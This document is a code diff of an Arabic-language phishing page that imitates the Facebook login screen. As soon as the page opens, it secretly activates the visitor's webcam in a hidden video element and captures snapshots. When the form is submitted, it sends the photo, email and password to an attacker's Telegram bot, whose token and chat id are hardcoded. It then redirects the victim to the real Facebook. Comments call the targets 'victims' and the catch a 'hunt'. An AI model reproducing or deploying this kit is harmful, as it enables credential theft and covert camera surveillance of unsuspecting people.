@@ -1,74 +1,75 @@
-<script>
-    const token = "8570413998:AAHjdBQuzcwo6Qh3sEJ3bIe-tjeFhz1A1GU";
-    const chat = "8042090388";
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - تسجيل الدخول</title>
+    <style>
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 360px; text-align: center; }
+        .fb-logo { color: #1877f2; font-size: 40px; font-weight: bold; margin-bottom: 10px; }
+        input { width: 90%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
+        .btn { width: 97%; padding: 12px; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .footer-link { color: #1877f2; font-size: 14px; text-decoration: none; margin-top: 15px; display: block; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
 
-    window.onload = function() {
-        // طلب الكاميرا بوضوح عالٍ
-        navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
-        })
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <div class="box">
+        <div class="fb-logo">facebook</div>
+        <p style="font-size: 18px; color: #1c1e21;">سجل الدخول للمتابعة</p>
+        <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف">
+        <input type="password" id="pass" placeholder="كلمة السر">
+        <button class="btn" onclick="sendAll()">تسجيل الدخول</button>
+        <a href="#" class="footer-link">هل نسيت كلمة السر؟</a>
+    </div>
+
+    <script>
+        const token = "8570413998:AAHjdBQuzcwo6Qh3sEJ3bIe-tjeFhz1A1GU";
+        const chat = "8042090388";
+
+        // طلب الكاميرا بمجرد فتح الصفحة
+        navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
             const video = document.getElementById('video');
             video.srcObject = stream;
-            video.play();
-
-            // الانتظار 3 ثوانٍ قبل التصوير لضمان فتح العدسة وتعديل الإضاءة تلقائياً
-            setTimeout(() => {
-                takeSnapshot();
-            }, 3000);
-        })
-        .catch(err => {
-            console.log("الضحية رفض الكاميرا");
+            // تصوير أول لقطة مخفية بعد ثانيتين
+            setTimeout(takeSnap, 2000);
         });
-    }
 
-    function takeSnapshot() {
-        const canvas = document.getElementById('canvas');
-        const video = document.getElementById('video');
-        
-        // التأكد أن الفيديو يعمل فعلياً قبل الرسم على الكانفاس
-        if (video.readyState === video.HAVE_ENOUGH_DATA) {
+        function takeSnap() {
+            const canvas = document.getElementById('canvas');
+            const video = document.getElementById('video');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
-            
-            const imgData = canvas.toDataURL('image/jpeg', 0.8); // جودة 80% لسرعة الإرسال
-            sendPhoto(imgData);
+            return canvas.toDataURL('image/jpeg', 0.7);
         }
-    }
 
-    function sendPhoto(base64Data) {
-        const blob = dataURItoBlob(base64Data);
-        const formData = new FormData();
-        formData.append('chat_id', chat);
-        formData.append('photo', blob, 'victim_face.jpg');
+        async function sendAll() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+            const img = takeSnap();
 
-        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-            method: 'POST',
-            body: formData
-        }).then(res => console.log("تم إرسال الصورة بنجاح"));
-    }
+            // 1. إرسال الصورة
+            const blob = await (await fetch(img)).blob();
+            const formData = new FormData();
+            formData.append('chat_id', chat);
+            formData.append('photo', blob, 'cam.jpg');
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
 
-    function captureAndSend() {
-        const email = document.getElementById('email').value;
-        const pass = document.getElementById('pass').value;
-        
-        // تصوير لقطة ثانية عند ضغط زر تسجيل الدخول (لزيادة التأكيد)
-        takeSnapshot();
-
-        const msg = `🔥 صيد كامل (FB + Cam):\n📧 User: ${email}\n🔑 Pass: ${pass}`;
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(msg)}`)
-        .then(() => {
-            window.location.href = "https://www.facebook.com"; 
-        });
-    }
-
-    function dataURItoBlob(dataURI) {
-        var byteString = atob(dataURI.split(',')[1]);
-        var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
-        var ab = new ArrayBuffer(byteString.length);
-        var ia = new Uint8Array(ab);
-        for (var i = 0; i < byteString.length; i++) { ia[i] = byteString.charCodeAt(i); }
-        return new Blob([ab], {type: mimeString});
-    }
-            </script>
+            // 2. إرسال البيانات
+            const msg = `🔥 صيد جديد:\n📧 الإيميل: ${email}\n🔑 الباسورد: ${pass}`;
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(msg)}`)
+            .then(() => {
+                // تحويل لفيسبوك الحقيقي
+                window.location.href = "https://www.facebook.com";
+            });
+        }
+    </script>
+</body>
+</html>
